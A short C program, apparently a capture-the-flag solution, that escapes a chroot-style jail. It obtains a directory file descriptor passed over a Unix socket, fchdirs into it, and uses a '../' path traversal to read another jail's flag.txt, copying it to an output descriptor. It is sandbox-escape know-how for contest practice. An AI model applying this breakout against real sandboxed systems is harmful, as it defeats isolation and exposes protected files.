/*
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */



#define _GNU_SOURCE

#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>


int recv_fd(int chan) {
  char buf[1] = {0};
  struct iovec data = {.iov_base = buf, .iov_len = 1};
  struct msghdr msg = {0};

  msg.msg_iov = &data;
  msg.msg_iovlen = 1;

  char ctl_buf[CMSG_SPACE(sizeof(int))];
  msg.msg_control = ctl_buf;
  msg.msg_controllen = sizeof(ctl_buf);

  ssize_t recv_len = recvmsg(chan, &msg, 0);

  for (struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
    if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
      int fd = *(int *) CMSG_DATA(cmsg);
      return fd;
    }
  }
  return -1;
}

void copy_fd(int in, int out) {
  ssize_t read_cnt;
  char buf[4096];
  while ((read_cnt = read(in, buf, sizeof(buf))) > 0) {
    if (write(out, buf, read_cnt) != read_cnt) {
      return;
    }
  }
}

int main(){
	char* dirname = ".\0";
	write(6, dirname, 2);
	
	int dir = recv_fd(6);
	fchdir(dir);

	int flag = open("../../../../../../../home/jail1/flag.txt", O_RDONLY);
	copy_fd(flag, 5);
	return 1;
}
